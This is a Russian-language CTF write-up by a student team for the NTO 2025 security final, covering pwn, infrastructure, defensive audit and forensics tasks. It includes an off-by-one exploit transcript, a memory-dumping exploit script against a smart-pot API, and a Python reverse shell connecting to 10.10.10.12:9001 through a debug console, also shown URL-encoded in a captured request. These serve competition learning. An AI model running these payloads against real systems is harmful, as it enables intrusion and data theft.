# Райтап на финал иб нто 2025 от команды While_hot_false
## Состав
* Walter White
* eogod
* Kolya080808
* kvasilek
# Задачи с коротким ответом

## Web
### Pwn 1
Из функции write_file() : 
```
  printf("Enter file content: ");
  __isoc99_scanf("%256s", file_buffer);
  flush();
  file = open(path, 65, 0, v0, v1, v2);
```
При этом file buffer сам размером 256 байт, а после него лежит secret password:
```
.bss:0000000000004120 file_buffer     db 100h dup(?)          ; DATA XREF: init_storage+70↑o
.bss:0000000000004120                                         ; init_storage+A8↑o ...
.bss:0000000000004220                 public secret_password
.bss:0000000000004220 ; char secret_password[32]
.bss:0000000000004220 secret_password db 20h dup(?)   
```
scanf("%256s", file_buffer) записывает максимум 256 байт + 1 ноль байт, который попадёт уже в secret_pasword. В итоге пароль начинается с 0x00, то есть по факту пустая строка. \
Решение: 
* Записываем в файл 256 букв 
* Запрашиваем чтение 00000000 и при запросе пароля просто нажимаем enter 
* Получаем флаг
```
nc 10.10.11.101 9001
                    
            +++++++                )                           
          +++      ++           ( /(   (     )           (     
   ++++++++         ++++        )\()) ))   (     `  )   )\ )  
  ++                   +++     (_))/ /((_)  )\  ' /(/(  (()/(  
 ++          ++          ++    | |_ (_))  _((_)) ((_)_\  )(_)) 
 ++        ++++++.       ++    |  _|/ -_)| '  \()| '_ \)| || | 
  +++        ++        +++      \__|\___||_|_|_| | .__/  \_, | 
    :+++++++ ++  +++++++                         |_|     |__/  
             ++                                  
             ++                                  
    finally, service for reading and             
                writng your OWN temporary files! 


Commands:
        1. Read file
        2. Write file
>> 2
Enter file content: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Your file ID: 0a09d600

Commands:
        1. Read file
        2. Write file
>> 1
Enter file ID: 00000000
Opa, give me password: 
File contains: nto{sup3r_s3cr3t_c0nf1d3ntial_fl4g}
Commands:
        1. Read file
        2. Write file
>> 

```
### Касса
перенос строк через \ кстати делается \
перенос строк через \ кстати делается
## Infra

### Confluence
всем респект
### NAS
да таск халява
### NAS2
коля респект
### Сервер печати

# Задачи с защитой
## Непрошеные гости! - 1 и Непрошеные гости! - 2




auth/main.py: \

1. Хранение паролей в открытом виде: \
	В методе /register пароль пользователя сохраняется в базу данных без хэширования: \
	db_user = models.User(username=user.username, password=user.password) \
    Злоумышленник получает доступ к базе данных (например, через SQL-инъекцию или компрометацию сервера). \
    Пароли хранятся в открытом виде, что позволяет злоумышленнику использовать их для входа в систему под другими пользователями. \
    фикс: 
    ```
    from passlib.context import CryptContext
    pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
    hashed_password = pwd_context.hash(user.password)
    db_user = models.User(username=user.username, password=hashed_password)
    ```
2. Аналогично 1му - Проверка пароля без хэширования: \
    В методе /token пароль проверяется напрямую: \
    
    ```
    if not user or form_data.password != user.password:
    ```
    
фикс:
    ``` if not user or not pwd_context.verify(form_data.password, user.password):``` 


3. Отсутствие ограничения времени жизни токена  \
	В коде используется JWT для создания токенов доступа, однако не указано его время жизни. \
	access_token = security.create_access_token(data={"sub": user.username}) \
	    Злоумышленник перехватывает JWT-токен (например, через XSS или MitM). \
    Токен остаётся действительным практически бесконечно (ACCESS_TOKEN_EXPIRE_MINUTES = 10000000000000000000), что позволяет злоумышленнику использовать его длительное время.  \
    фикс: \
    установить реалистичное время истечения токена: ACCESS_TOKEN_EXPIRE_MINUTES = 52 \
    
4. Токены добавляются в чёрный список только при выходе пользователя, если злоумышленник перехватит действующий токен до его добавления в чёрный список, он сможет использовать его до окончания лайфтайма: \
	```
 	async def  \
	@app.post("/logout") \
	logout(token: str = Depends(oauth2_scheme)): \
	    security.blacklist_token(token) \
	    return {"msg": "Successfully logged out"} \
	```
auth/models.py \

1. Отсутсвтуют какие-либо ограничения на длинну и значения пароля и юзернейма: \
	username = Column(String, unique=True, index=True) \
	password = Column(String) \
	Отсутствие валидации входных данных   \
	Вектор атаки:  \
	Злоумышленник отправляет специально сформированные данные (например, очень длинные строки или специальные символы) для эксплуатации уязвимостей. \
	Отсутствие валидации может привести к ошибкам в работе приложения или SQL-инъекциям. \
	фикс: \
 ```
	class UserCreate(BaseModel):
    		username: str = Field(..., min_length=3, max_length=50, regex="^[a-zA-Z0-9_]+$")
    		password: str = Field(..., min_length=8)
 ```
	
auth/security.py

1. В файле используется фиксированный секретный ключ(как константа):
	SECRET_KEY = "Abqh4LSVdohqrlhtalvifAmEsymAvY9p"
	Используя этот ключ, злоумышленник может подделывать JWT-токены.
	фикс:
	import os
	from secrets import token_hex
	SECRET_KEY = os.getenv("SECRET_KEY", token_hex(32))
	
2. Огромное вреся жизни токена:
	ACCESS_TOKEN_EXPIRE_MINUTES = 10000000000000000000 
	
3. Отсутствие механизма обновления токена.

4. Нереалистичные значения для блокировки пользователей.
	MAX_LOGIN_ATTEMPTS = 10000000000000000000
	BLOCK_TIME_MINUTES = 0
	Вектор атаки: 
	Злоумышленник выполняет атаку подбора паролей (brute-force attack).
	Параметры блокировки пользователей (MAX_LOGIN_ATTEMPTS = 10000000000000000000, BLOCK_TIME_MINUTES = 0) делают защиту фактически бесполезной.
	фикс: 
	MAX_LOGIN_ATTEMPTS = 5
	BLOCK_TIME_MINUTES = 15
     
/auth/migrations/env.py



/app/diary/settings.py

1. Режим DEBUG включен (DEBUG = True)
	Злоумышленник может вызвать ошибку и получить доступ к внутренней информации, что упрощает дальнейшие атаки.
	фикс:
	отключить debug
	
2. Секретный ключ Djangoявляется константой. Ключ используется для шифрования сессий, генерации токенов и других security-related функций. \
	```
 	SECRET_KEY = "Abqh4LSVdohqrlhtalvifAmEsymAvY9p"
	фикс:
	import os
	from secrets import token_hex
	SECRET_KEY = os.getenv("SECRET_KEY", token_hex(32))
 	```
	
3. Отсутствие HTTPS
	* Вектор атаки:
	** может привести к атакам MITM.
	* фикс:
	```
 	uvicorn.run(app, host={ipadr}, port=8000, ssl_keyfile={key}, ssl_certfile="{cert})
  	```

/app/diary/urls.py \

1. Нет ограничений на частоту запросов к API/формам (например, login/), что упрощает брутфорс. \

/app/mysite/views.py \

1. SQL-инъекции 
	* user_login: Сырой SQL-запрос с вставкой username и password.
        * mark_add_view: SQL-инъекция в INSERT через параметры student_login, mark_value, date. 
        * search: Сырой запрос с LIKE '{query}'.
    Вектор атаки: \
    Злоумышленник может выполнить произвольные SQL-запросы, украсть данные, удалить таблицы или получить контроль над БД. \
    фикс: \
    использовать ORM Django или параметризованные запросы (cursor.execute("SELECT ... WHERE login = %s", [username])). \
    

2. Отключена защита от CSRF \
	@csrf_exempt \  
	фикс: \
	убрать данную строку, настроить CORS с использованием middleware. \
	

3. Недостаточная проверка прав доступа. В profile_edit нет проверки, что пользователь редактирует свой профиль.
	фикс:
 	```python
	    if request.method == 'POST':
        form = EditProfileForm(request.POST)
        if form.is_valid():
            cd = form.cleaned_data
            new_username = cd.get('username')
            if new_username != user.login:
                return HttpResponseForbidden("Нельзя изменить чужой логин")
        ```
/app/mysite/migrations/0001_initial.py

1. Уязвимость в User.photo (FilePathField)
    FilePathField без ограничений (path, match) позволяет указывать любые пути на сервере.
    Вектор атаки: 
    Злоумышленник может получить доступ к системным файлам (например, ../../etc/passwd).
    фикс:
    photo = models.FilePathField(path="/safe/upload/dir/", match=".*\.(jpg|png)$")
    
  









## Кроличий горшок 2.0 
https://qwqoro.works/articles/plants-vs-bugs \
У горшочка есть апи на 80 порту, позволяющее получить заряд горшка, влажность, температуру и прочую информацию о горшке(метод GET_SNAPSHOT). \

Ту же самую информацию можно получить через метод GET_PROPERTY, передав в param индекс массива. Суть в том, что можно обратиться за индексы массивы и прочитать произвольную память. Последовательно перебирая индекс, получим дамп, в котором лежит флаг \

Exploit:
```
import struct
import requests

start_param = -2000
end_param = 5000

with open("dumpy.bin", "wb") as f:
    for i in range(start_param, end_param):
        print(f"[*] Requesting {i}")
        r = requests.post("http://10.10.1.172/control", json={"cmd": 1, "param": i})
        value = r.json()["value"]
        if type(value) == int:
            f.write(struct.pack("<i", value))
        elif type(value) == float:
            f.write(struct.pack("<f", value))
        elif value is None:
            f.write(struct.pack("<i", 0))
        else:
            print("Unknown type!", value)
        f.flush()
```
Кусок дампа, где лежит пароль от вай-фай сети ASUS-3:
```
000019b0  00 00 00 00 00 00 00 00  75 75 69 64 33 36 65 63  |........uuid36ec|
000019c0  35 64 32 31 30 62 34 38  37 65 38 39 00 00 00 00  |5d210b487e89....|
000019d0  00 00 59 42 33 36 45 59  55 52 61 39 52 33 6d 6c  |..YB36EYURa9R3ml|
000019e0  64 35 6a 6e 37 58 6e 30  34 43 6a 4c 56 72 31 44  |d5jn7Xn04CjLVr1D|
000019f0  51 56 61 77 31 70 32 00  00 00 00 00 00 00 00 00  |QVaw1p2.........|
00001a00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00001a10  00 00 00 58 66 73 32 49  32 62 53 33 63 75 76 4b  |...Xfs2I2bS3cuvK|
00001a20  44 49 63 77 35 79 55 62  57 41 6d 73 61 36 34 74  |DIcw5yUbWAmsa64t|
00001a30  49 47 6a 00 53 6d 61 72  74 4c 69 66 65 5f 49 76  |IGj.SmartLife_Iv|
00001a40  79 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |y...............|
00001a50  00 00 00 00 00 69 63 6c  31 32 33 31 35 39 00 00  |.....icl123159..|
00001a60  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001ab0  00 00 00 00 00 00 00 00  00 00 00 00 06 00 41 53  |..............AS|
00001ac0  55 53 2d 33 00 00 00 00  00 00 00 00 00 00 00 00  |US-3............|
00001ad0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 6e  |...............n|
00001ae0  74 6f 7b 70 30 37 5f 77  68 34 37 35 5f 31 6e 5f  |to{p07_wh475_1n_|
00001af0  75 72 5f 68 33 34 64 7d  00 00 00 00 00 00 00 00  |ur_h34d}........|
00001b00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
```

## Враг врага 2 - 1
через /console, который доступен, потому что на питоновском веб сервере включен debug, был прокинут реверс шелл на питоне:
```
>>> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.12&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)
```
## Враг врага 2 - 2
Ответ: 10.10.10.12, 81.177.221.242
* 10.10.10.12 - посылал запрос на /console с реверс шеллом на 172.18.0.3
```
GET /console?&__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.10.12%22%2C9001))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22bash%22)&frm=0&s=yqqPfQiFZmXsmnZQYMPF HTTP/1.1
Host: 10.10.10.3:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.3:5000/console
Connection: keep-alive
Cookie: hide-dotfile=no; __wzd44828fdba9134e8d1a6f=1737574404|9130fd746c6b
Priority: u=0
```
* 81.177.221.242 - c этого айпишника был скачан бинарник, лежащий на /app
## Враг врага 2 - 4 
В пакете 1424 через реверс шелл выполняется ./app \
Ответ: Arrival Time: Jan 22, 2025 22:35:52.600327626 MSK \
UTC Arrival Time: Jan 22, 2025 19:35:52.600327626 UTC
## Markdown 
[Как пользоваться](https://github.com/adam-p/markdown-here/wiki/markdown-cheatsheet#lists)

## Враг врага 1-1
через почту в архиве npp.zip
```
From - Tue Dec 10 18:32:05 2024
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: admin@mailservice.pma.ru
Received: from [IPv6:::ffff:127.0.0.1] (DESKTOP-5UI5AFR.domain.com [127.0.0.1])
    by DESKTOP-5UI5AFR with ESMTPA
    ; Fri, 22 Nov 2024 21:19:49 +0300
Message-ID: &lt;7580751D-294B-4A69-AE4B-D42123B5FC66@DESKTOP-5UI5AFR&gt;
MIME-Version: 1.0
To: "rromanov@mailservice.pma.ru" 
From: admin 
Subject:
 =?utf-8?B?0J7QsdC90L7QstC70LXQvdC40LUg0L/QsNGA0L7Qu9C10Lkg0L/QvtC70Yy=?=
 =?utf-8?B?0LfQvtCy0LDRgtC10LvQtdC5?=
Date: Fri, 22 Nov 2024 21:19:49 +0300
Importance: normal
X-Priority: 3
Content-Type: multipart/mixed;
    boundary="_13058A1F-367B-49C5-9E07-ACB8AEE1516D_"

--_13058A1F-367B-49C5-9E07-ACB8AEE1516D_
Content-Type: multipart/alternative;
    boundary="_BA29F595-B28D-449D-85E7-8549EB2289F3_"

--_BA29F595-B28D-449D-85E7-8549EB2289F3_
Content-Transfer-Encoding: base64
Content-Type: text/plain; charset="utf-8"

DQrQntCx0L3QvtCy0LjRgtC1INC/0LDRgNC+0LvRjCDQsiDRgdC+0L7RgtCy0LXRgtGB0YLQstC4
0Lgg0YEg0L/RgNC40LrRgNC10L/Qu9C10L3QvdC+0Lkg0YLQsNCx0LvQuNGG0LXQuS4NCg==

--_BA29F595-B28D-449D-85E7-8549EB2289F3_
Content-Transfer-Encoding: base64
Content-Type: text/html; charset="utf-8"

PGh0bWwgeG1sbnM6bz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTpvZmZpY2U6b2ZmaWNlIiB4
bWxuczp3PSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOm9mZmljZTp3b3JkIiB4bWxuczptPSJo
dHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL29mZmljZS8yMDA0LzEyL29tbWwiIHhtbG5zPSJo
dHRwOi8vd3d3LnczLm9yZy9UUi9SRUMtaHRtbDQwIj48aGVhZD48bWV0YSBodHRwLWVxdWl2PUNv
bnRlbnQtVHlwZSBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPjxtZXRhIG5hbWU9

```
